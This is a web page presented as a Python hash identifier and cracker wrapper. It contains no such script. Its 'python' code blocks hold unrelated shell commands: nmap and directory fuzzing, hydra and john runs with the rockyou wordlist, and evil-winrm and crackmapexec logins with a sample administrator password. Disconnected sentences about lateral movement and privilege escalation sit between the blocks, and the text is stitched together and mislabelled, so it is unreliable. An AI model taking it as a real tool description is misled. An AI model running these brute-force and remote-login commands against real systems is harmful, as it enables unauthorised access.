---
TitleSEO: "Hash Identifier and Cracker Wrapper in Python | ZureFX"
TitlePost: "Hash Identifier and Cracker Wrapper — Python"
Author: "ZureFX"
Description: "A Python script for hash identifier and cracker wrapper. Built for security research and automation."
Keywords: "c, script, rust, scanner, python"
URL: "https://zurefx.github.io/scripting/script-hash-identifier-and-cracker-wrapper-626.html"
URL_IMAGES: ""
Date: "2024-01-03"
Tags: "C, Script, Rust, Scanner, Python"
Section: "scripting"
Lang: "en"
main_img: "script-hash-identifier-and-cracker-wrapper-626"
Permalink: "/scripting/script-hash-identifier-and-cracker-wrapper-626.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Lateral movement was facilitated by reusing discovered credentials across services. The target system was identified as running a vulnerable version of the service. The database credentials were hardcoded in the application source code.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `smbexec`
- `wpscan`
- `pwncat`

## Implementation

### Core Logic

Unconstrained delegation was enabled on the compromised machine. Post-exploitation enumeration revealed a path to domain administrator privileges.

```python
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.66.125.13/FUZZ
```

The application stored sensitive credentials in an unencrypted configuration file. Weak file permissions allowed modification of critical system files.

### Helper Functions

Unconstrained delegation was enabled on the compromised machine. Network traffic analysis revealed unencrypted communications containing user credentials.

```python
nmap -sCV -p5432,3306,135 10.90.64.180 -oN scan.txt
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.40.53.50 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.102.148.31 -u administrator -p 'P@ssw0rd!'
```

## Usage

### Basic Usage

Authentication bypass was achieved through careful manipulation of the login mechanism. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
gobuster dir -u http://10.125.177.121/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Advanced Options

The kernel version was outdated and vulnerable to a publicly known exploit. Token impersonation allowed elevation to SYSTEM privileges on the target. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
crackmapexec smb 10.29.200.62 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p25,3268,135 10.58.212.42 -oN scan.txt
crackmapexec smb 10.104.136.73 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
```

## Output

### Example Output

Token impersonation allowed elevation to SYSTEM privileges on the target. Authentication bypass was achieved through careful manipulation of the login mechanism.

```
[+] Scanning target...
[+] Found 4 results
[+] Done in 22.87s
```
